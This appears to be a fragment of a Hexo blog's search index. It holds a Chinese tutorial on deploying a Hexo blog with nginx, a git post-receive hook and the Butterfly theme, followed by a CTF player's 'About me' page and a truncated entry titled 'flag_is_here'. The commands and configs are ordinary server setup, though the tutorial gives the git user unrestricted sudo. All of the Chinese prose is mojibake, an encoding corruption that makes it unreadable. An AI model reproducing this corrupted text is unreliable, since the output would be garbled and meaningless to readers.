éœ€è¦æœ‰ä¸€å°äº‘æœåŠ¡å™¨ï¼ˆLinuxç³»ç»Ÿï¼‰å®ä¾‹ï¼Œè¿™é‡Œä»¥åŸºäºDebian å‘è¡Œç‰ˆçš„Ubuntu 22.04ä¸ºä¾‹</p><p>å¯¹äºä¸ªäººåšå®¢ï¼Œå»ºè®®ä½¿ç”¨1æ ¸CPUã€1GBå†…å­˜ã€20GBå­˜å‚¨åŠä»¥ä¸Šé…ç½®çš„è½»é‡çº§é…ç½®ï¼›å¸¦å®½é€‚é‡æé«˜</p><h4 id="æœ¬åœ°ç«¯ç¯å¢ƒé…ç½®"><a href="#æœ¬åœ°ç«¯ç¯å¢ƒé…ç½®" class="headerlink" title="æœ¬åœ°ç«¯ç¯å¢ƒé…ç½®"></a>æœ¬åœ°ç«¯ç¯å¢ƒé…ç½®</h4><p>è§ä¸Šæ–‡ï¼Œåˆå§‹åŒ–é¡¹ç›®ç»“æŸï¼Œå¯ä»¥é€šè¿‡localhostè®¿é—®å³å¯ã€‚</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510191534145.png" alt="image-20251017085845604"></p><h4 id="æœåŠ¡ç«¯ç¯å¢ƒé…ç½®"><a href="#æœåŠ¡ç«¯ç¯å¢ƒé…ç½®" class="headerlink" title="æœåŠ¡ç«¯ç¯å¢ƒé…ç½®"></a>æœåŠ¡ç«¯ç¯å¢ƒé…ç½®</h4><h5 id="å‰ç½®ï¼š"><a href="#å‰ç½®ï¼š" class="headerlink" title="å‰ç½®ï¼š"></a>å‰ç½®ï¼š</h5><p>å¼€æ”¾æœåŠ¡å™¨å¸¸ç”¨ç«¯å£ï¼Œé…ç½®å¥½é˜²ç«å¢™æˆ–å®‰å…¨ç»„ç­‰</p><p>è®¿é—®æœåŠ¡å™¨ç»ˆç«¯è¿›è¡Œç¯å¢ƒé…ç½®</p><h5 id="1-å®‰è£…gitå’Œnginx"><a href="#1-å®‰è£…gitå’Œnginx" class="headerlink" title="1. å®‰è£…gitå’Œnginx"></a>1. å®‰è£…gitå’Œnginx</h5><p>æ›´æ–°è½¯ä»¶åŒ…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure><p>å®‰è£…Nginx:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt -y install nginx git</span><br></pre></td></tr></table></figure><p>éªŒè¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure><p>å¯åŠ¨nginxæœåŠ¡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> nginx.service</span><br><span class="line">systemctl start nginx.service</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹çŠ¶æ€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx.service</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¾ç¤º<strong>active</strong>ï¼Œé‚£ä¹ˆå°±ä»£è¡¨å®‰è£…æˆåŠŸäº†ã€‚</p><h5 id="2-é…ç½®gitä»“åº“å’ŒHOOK"><a href="#2-é…ç½®gitä»“åº“å’ŒHOOK" class="headerlink" title="2. é…ç½®gitä»“åº“å’ŒHOOK"></a>2. é…ç½®gitä»“åº“å’ŒHOOK</h5><p>åˆ›å»ºgitç”¨æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºç”¨æˆ·,ç”¨æˆ·åä¸ºgit</span></span><br><span class="line">adduser git</span><br><span class="line"><span class="comment">#è®¾ç½®å¯†ç </span></span><br><span class="line">passwd git</span><br></pre></td></tr></table></figure><p>æŠŠgitç”¨æˆ·æ·»åŠ åˆ°sudoç”¨æˆ·ç»„ä¸­:</p><p>è¾“å…¥<code>sudo vi /etc/sudoers</code>ï¼Œæ‰“å¼€sudoersæ–‡ä»¶</p><p>åˆ°ä»£ç è¡Œ<code>root ALL=(ALL) ALL</code>,ç„¶ååœ¨è¿™ä¸€è¡Œä¸‹æ·»åŠ ä»¥ä¸‹ä»£ç <code>git ALL=(ALL) ALL</code>ã€‚</p><p>è¾“å…¥å®Œæ¯•ä¹‹åï¼ŒæŒ‰<code>wq!</code>å¼ºåˆ¶ä¿å­˜é€€å‡ºviã€‚</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510191634455.png" alt="image-20251019163431332"></p><p>åˆ‡æ¢åˆ°gitç”¨æˆ·ï¼Œæ·»åŠ SSH Keyæ–‡ä»¶å¹¶ä¸”è®¾ç½®ç›¸åº”çš„è¯»å†™ä¸æ‰§è¡Œæƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ‡æ¢ç”¨æˆ·</span></span><br><span class="line">su git</span><br><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.ssh</span><br><span class="line"><span class="comment"># æ–°å»ºæ–‡ä»¶</span></span><br><span class="line">vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠ<strong>ä¹‹å‰åœ¨å®¢æˆ·ç«¯è®¾ç½®çš„SSH Key</strong>,å¤åˆ¶åˆ°authorized_keysæ–‡ä»¶ä¸­ï¼Œä¿å­˜åé€€å‡ºã€‚</p><p>é…ç½®æƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾gitä»“åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /home/git/</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R <span class="variable">$USER</span>:<span class="variable">$USER</span> /home/git/</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /home/git/</span><br></pre></td></tr></table></figure><p>åˆ›å»ºgitä»“åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/git/</span><br><span class="line">git init --bare blog.git</span><br></pre></td></tr></table></figure><p> åˆ›å»ºhook:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --work-tree=/home/www/blog --git-dir=/home/git/blog.git checkout -f</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨john.git/hooksæ–‡ä»¶å¤¹ä¸‹ï¼Œä¿®æ”¹post-receiveæ–‡ä»¶æƒé™ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«æ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line"><span class="built_in">chmod</span> +x post-receive</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°çš„ç½‘ç«™é…ç½®æ–‡ä»¶ä¸­é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@å…¬ç½‘IP:/home/git/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>å†è¿è¡Œ<code>hexo cl; hexo g; hexo d</code>å³å¯éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Š</p><h5 id="3-é…ç½®nginxç¯å¢ƒ"><a href="#3-é…ç½®nginxç¯å¢ƒ" class="headerlink" title="3. é…ç½®nginxç¯å¢ƒ"></a>3. é…ç½®nginxç¯å¢ƒ</h5><p>åˆ›å»ºæ‰˜ç®¡åœ°å€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /home/www/blog</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R <span class="variable">$USER</span>:<span class="variable">$USER</span> /home/www/blog</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /home/www/blog</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¹‹ååšå®¢ç½‘é¡µæ–‡ä»¶çš„ä¸Šä¼ åœ°å€</p><p>ä¹‹åæ‰¾åˆ°nginxçš„é…ç½®æ–‡ä»¶ï¼ˆnginx.confï¼‰</p><p>ä¸€èˆ¬ä½äº/etc/nginxï¼Œä¹Ÿå¯ä»¥ç”¨<code>nginx -t</code>æ¥æŸ¥æ‰¾ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510191617914.png" alt="image-20251019161742863"></p><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„serveré¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  example.com;             #åŸŸå</span><br><span class="line"></span><br><span class="line">â€¦â€¦</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /home/www/blog;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯ä¿®æ”¹server_nameä¸rootï¼Œserver_nameä¿®æ”¹ä¸ºåŸŸåï¼Œæ²¡æœ‰åŸŸåå°±ä¸ç”¨ä¿®æ”¹äº†ï¼Œrootå°±æ˜¯blogé™æ€èµ„æºæ–‡ä»¶ç›®å½•ã€‚</p><p>ç„¶åé‡å¯nginxæœåŠ¡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart nginx.service</span><br></pre></td></tr></table></figure><h2 id="5-è‡ªå®šä¹‰åŸŸå"><a href="#5-è‡ªå®šä¹‰åŸŸå" class="headerlink" title="5. è‡ªå®šä¹‰åŸŸå"></a>5. è‡ªå®šä¹‰åŸŸå</h2><p>é¦–å…ˆä½ éœ€è¦å»æœç´¢ä½ æƒ³è¦çš„åŸŸåå»è´­ä¹°ä¸€ä¸ª</p><p>åœ¨å„å¤§äº‘å‚å•†éƒ½å¯ä»¥è´­ä¹°ï¼ˆé˜¿é‡Œäº‘/è…¾è®¯äº‘/ç™¾åº¦äº‘â€¦â€¦ï¼‰</p><p>ä¹‹åå°±å¯ä»¥è¿›è¡ŒåŸŸåçš„è§£æäº†</p><p>æ¨èè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/luoweifu/p/18361568">https://www.cnblogs.com/luoweifu/p/18361568</a></p><p>ä¾‹å¦‚ï¼šè¿æ¥åŸŸååˆ°githubï¼š</p><p>å³æ·»åŠ CNAMEè®°å½•ï¼Œå°†ä½ çš„åŸŸåæŒ‡å‘githubç»™ä½ åˆ†é…çš„åŸŸåã€‚</p><h2 id="6-ç½‘ç«™é¡µé¢ä¿®æ”¹å’Œä¸»é¢˜ç¾åŒ–"><a href="#6-ç½‘ç«™é¡µé¢ä¿®æ”¹å’Œä¸»é¢˜ç¾åŒ–" class="headerlink" title="6. ç½‘ç«™é¡µé¢ä¿®æ”¹å’Œä¸»é¢˜ç¾åŒ–"></a>6. ç½‘ç«™é¡µé¢ä¿®æ”¹å’Œä¸»é¢˜ç¾åŒ–</h2><p>é»˜è®¤çš„hexoé¡µé¢éå¸¸ç®€ä»‹è€Œä¸”ä¸ç¾è§‚ï¼Œå› æ­¤æƒ³è¦è®©è‡ªå·±çš„åšå®¢å˜å¾—å¥½çœ‹èµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„ä¸»é¢˜ï¼</p><h3 id="ä¸€-ä¸»é¢˜é…ç½®"><a href="#ä¸€-ä¸»é¢˜é…ç½®" class="headerlink" title="ä¸€.  ä¸»é¢˜é…ç½®"></a>ä¸€.  ä¸»é¢˜é…ç½®</h3><p>hexoæœ‰å¾ˆå¤šç§ä¸»é¢˜ï¼Œå¯ä»¥åˆ°å®˜ç½‘å»ä¸‹è½½æˆ–è€…åœ¨çº¿é¢„è§ˆå„ç§ä¸»é¢˜æ ·å¼çš„ç½‘é¡µï¼š<a href="http://hexo.io">http://hexo.io</a></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510201324556.png" alt="image-20251020132416362"></p><h4 id="ä¸‹è½½å¹¶åº”ç”¨ä¸»é¢˜ï¼š"><a href="#ä¸‹è½½å¹¶åº”ç”¨ä¸»é¢˜ï¼š" class="headerlink" title="ä¸‹è½½å¹¶åº”ç”¨ä¸»é¢˜ï¼š"></a>ä¸‹è½½å¹¶åº”ç”¨ä¸»é¢˜ï¼š</h4><p>è¿™é‡Œä»¥butterflyä¸»é¢˜ä¸ºä¾‹ï¼š</p><p>ä½¿ç”¨npmå®‰è£…ï¼ˆä¹Ÿå¯ä»¥å¦‚ä¸Šï¼Œä»å®˜ç½‘æœç´¢è¯¥ä¸»é¢˜å¹¶å®‰è£…ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-theme-butterfly</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œå°†ä¸»é¢˜<code>theme</code>æ”¹ä¸º<code>butterfly</code>:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510201339898.png" alt="image-20251020133958843"></p><p>å®‰è£…ä¾èµ–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>é‡æ–°hexoä¸‰è¿ï¼Œå¯ä»¥çœ‹åˆ°ç½‘é¡µå·²ç»åˆ‡æ¢äº†ä¸»é¢˜ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510201344098.png" alt="image-20251020134412004"></p><h4 id="åŸºç¡€ä¿¡æ¯é…ç½®ï¼š"><a href="#åŸºç¡€ä¿¡æ¯é…ç½®ï¼š" class="headerlink" title="åŸºç¡€ä¿¡æ¯é…ç½®ï¼š"></a>åŸºç¡€ä¿¡æ¯é…ç½®ï¼š</h4><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç°åœ¨æ ‡é¢˜è¿˜æ˜¯Hexoï¼Œè€Œä¸”æˆ‘ä»¬çš„å¤´åƒï¼Œæ˜µç§°ä»€ä¹ˆçš„ä¹Ÿä¸å¯¹ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å»é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ã€‚</p><p>æ³¨æ„ï¼ç½‘é¡µé…ç½®æ–‡ä»¶å’Œä¸»é¢˜é…ç½®æ–‡ä»¶çš„åŒºåˆ«ï¼š</p><p>æœ¬æ–‡ä¸­ï¼Œæ‰€æŒ‡çš„ç½‘é¡µé…ç½®æ–‡ä»¶æŒ‡çš„æ˜¯<code>_config.yml</code></p><p>è€Œä¸»é¢˜é…ç½®æ–‡ä»¶ï¼ŒæŒ‡çš„æ˜¯<code>_config.landscape.yml</code>æˆ–<code>_config.butterfly.yml</code></p><p>è¿™é‡Œï¼Œå¦‚æœæ˜¯é€šè¿‡npmå®‰è£…çš„ï¼Œæˆ‘ä»¬çš„<code>_config.butterfly.yml</code>ä¼šåœ¨è¿™ä¸ªä½ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€¦â€¦\node_modules\hexo-theme-butterfly\_config.yml</span><br></pre></td></tr></table></figure><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510201350064.png" alt="image-20251020135051897"></p><p>æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæ–‡ä»¶å¤åˆ¶ä¸€ä»½åˆ°æ ¹ç›®å½•ï¼Œå¹¶é‡å‘½åä¸ºï¼š<code>_config.butterfly.yml</code></p><p>è¿™æ ·æ–¹ä¾¿ç¼–è¾‘ï¼Œä¸”hexoé»˜è®¤ç¬¬ä¸€ä¼˜å…ˆä½¿ç”¨çš„æ˜¯è¿™é‡Œå¤åˆ¶çš„æ–‡ä»¶ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¼–è¾‘é…ç½®æ–‡ä»¶äº†ï¼</p><h5 id="config-yml-ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š"><a href="#config-yml-ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š" class="headerlink" title="_config.yml ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š"></a>_config.yml ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š</h5><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510201352671.png" alt="image-20251020135225519"></p><ol><li>Siteé¡¹ï¼š</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">mitu</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">é¡¹ç›®</th><th style="text-align:center">å†…å®¹</th></tr></thead><tbody><tr><td style="text-align:center">title</td><td style="text-align:center">ç½‘ç«™çš„æ ‡é¢˜</td></tr><tr><td style="text-align:center">subtitle</td><td style="text-align:center">å‰¯æ ‡é¢˜</td></tr><tr><td style="text-align:center">description</td><td style="text-align:center">é¡µé¢æè¿°</td></tr><tr><td style="text-align:center">keywords</td><td style="text-align:center">é¡µé¢å…³é”®å­—</td></tr><tr><td style="text-align:center">author</td><td style="text-align:center">ä½ çš„åå­—</td></tr><tr><td style="text-align:center">language</td><td style="text-align:center">ç½‘ç«™ä½¿ç”¨çš„è¯­è¨€ï¼ˆzh-CNï¼‰</td></tr><tr><td style="text-align:center">timezone</td><td style="text-align:center">ç½‘ç«™æ—¶åŒºï¼ˆAsia/Shanghaiï¼‰</td></tr></tbody></table></div><ol><li>URLï¼šå¡«å†™æˆä½ è‡ªå·±çš„åŸŸåå³å¯</li></ol><h5 id="config-butterfly-yml-ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š"><a href="#config-butterfly-yml-ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š" class="headerlink" title="_config.butterfly.yml ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š"></a>_config.butterfly.yml ç½‘ç«™é…ç½®æ–‡ä»¶ï¼š</h5><ol><li>menué¡¹ï¼šç½‘ç«™çš„èœå•ï¼ŒæŒ‡å‘ä½ çš„æ¯ä¸€ä¸ªé¡µé¢ï¼Œéœ€è¦å»æ‰æ³¨é‡Šã€‚</li></ol><p>ä¾‹å¦‚ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251231181858038.png" alt="image-20251231181858038"></p><ol><li>code_blocksé¡¹ï¼šä»£ç å—çš„ä¸»é¢˜ï¼Œé£æ ¼è°ƒæ•´</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">code_blocks:</span></span><br><span class="line">  <span class="comment"># Code block theme: darker / pale night / light / ocean / false</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">light</span></span><br><span class="line">  <span class="attr">macStyle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Code block height limit (unit: px)</span></span><br><span class="line">  <span class="attr">height_limit:</span> <span class="number">200</span></span><br><span class="line">  <span class="attr">word_wrap:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><ol><li>socialé¡¹ï¼š å¡«å†™è‡ªå·±çš„è”ç³»æ–¹å¼</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">fab fa-github:</span> <span class="string">https://xxxxxx/xxxxxx</span> <span class="string">||</span> <span class="string">Github</span> <span class="string">||</span> <span class="string">&#x27;#24292e&#x27;</span></span><br><span class="line">  <span class="attr">fas fa-envelope:</span> <span class="string">mailto:xxxxxx@qq.com</span> <span class="string">||</span> <span class="string">Email</span> <span class="string">||</span> <span class="string">&#x27;#4a7dbe&#x27;</span></span><br></pre></td></tr></table></figure><ol><li>avatar: ç½‘ç«™å›¾æ ‡å’Œå¤´åƒ</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">img:</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><ol><li>banner imagesï¼š ç½‘ç«™å„ä¸ªåœ°æ–¹çš„bannerså›¾ç‰‡(å…·ä½“çœ‹è‡ªå·±åº”ç”¨)</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Disable all banner images</span></span><br><span class="line"><span class="attr">disable_top_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of page not setting, it will show the default_top_img</span></span><br><span class="line"><span class="attr">default_top_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of index page</span></span><br><span class="line"><span class="attr">index_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of archive page</span></span><br><span class="line"><span class="attr">archive_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> tag page, not tags page</span></span><br><span class="line"><span class="attr">tag_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of tag page, you can set the banner image for each tag</span></span><br><span class="line"><span class="comment"># Format:</span></span><br><span class="line"><span class="comment">#  - tag name: xxxxx</span></span><br><span class="line"><span class="attr">tag_per_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> category page, not categories page</span></span><br><span class="line"><span class="attr">category_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of category page, you can set the banner image for each category</span></span><br><span class="line"><span class="comment"># Format:</span></span><br><span class="line"><span class="comment">#  - category name: xxxxx</span></span><br><span class="line"><span class="attr">category_per_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The background image of footer</span></span><br><span class="line"><span class="attr">footer_img:</span></span><br></pre></td></tr></table></figure><ol><li>backgroundé¡¹ï¼šç½‘ç«™çš„èƒŒæ™¯å›¾ç‰‡</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">background:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">background.png</span></span><br></pre></td></tr></table></figure><p>å¾…æ›´æ–°ä¸­â€¦â€¦</p><h2 id="7-å›¾åºŠé…ç½®"><a href="#7-å›¾åºŠé…ç½®" class="headerlink" title="7. å›¾åºŠé…ç½®"></a>7. å›¾åºŠé…ç½®</h2><p>å¾…æ›´æ–°ä¸­â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºæˆ‘</title>
      <link href="/2025/01/12/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/"/>
      <url>/2025/01/12/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="ğ—›ğ—²ğ—¹ğ—¹ğ—¼"><a href="#ğ—›ğ—²ğ—¹ğ—¹ğ—¼" class="headerlink" title="ğ—›ğ—²ğ—¹ğ—¹ğ—¼!"></a>ğ—›ğ—²ğ—¹ğ—¹ğ—¼!</h1><p><strong>ğ—œâ€™ğ—º Mitunlny, A CTFer from UKFC/V&amp;N</strong></p><p>ä¸ä¹±äºå¿ƒï¼Œä¸å›°äºæƒ…ã€‚ä¸ç•å°†æ¥ï¼Œä¸å¿µè¿‡å¾€ã€‚å¦‚æ­¤ï¼Œå®‰å¥½ã€‚</p><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><ul><li>ğŸ‘¨â€ğŸ’» My blog: <a href="http://czxh.top">http://czxh.top</a></li><li>ğŸ“« How to reach me: mitunlny@foxmail.com</li></ul><h2 id="My-friends-linkï¼š"><a href="#My-friends-linkï¼š" class="headerlink" title="My friends linkï¼š"></a>My friends linkï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- name: Mitunlny</span><br><span class="line">  link: https://czxh.top</span><br><span class="line">  avatar: https://mitunlny.oss-cn-beijing.aliyuncs.com/MY.jpg</span><br><span class="line">  descr:  è®¤çœŸè¿‡å¥½æ¯ä¸€å¤©ï¼(=^â–½^=)</span><br><span class="line">  siteshot: https://mitunlny.oss-cn-beijing.aliyuncs.com/202510271822043.png</span><br></pre></td></tr></table></figure><p>å†°å†°é‚¦é‚¦~~~~ğŸ‰ğŸ‰ğŸ‰</p><p><em>æœ¬ç«™éƒ¨åˆ†ç´ ææ¥æºäºç½‘ç»œï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»åšä¸»è¿›è¡Œåˆ é™¤ï¼šmitunlny@foxmail.com</em></p>]]></content>
      
      
      <categories>
          
          <category> ä¸ªäºº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸ªäºº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flag_is_here</title>
      <link href="/2016/03/30/flag/"/>
      <url>/2016/03/30/flag/</url>
      
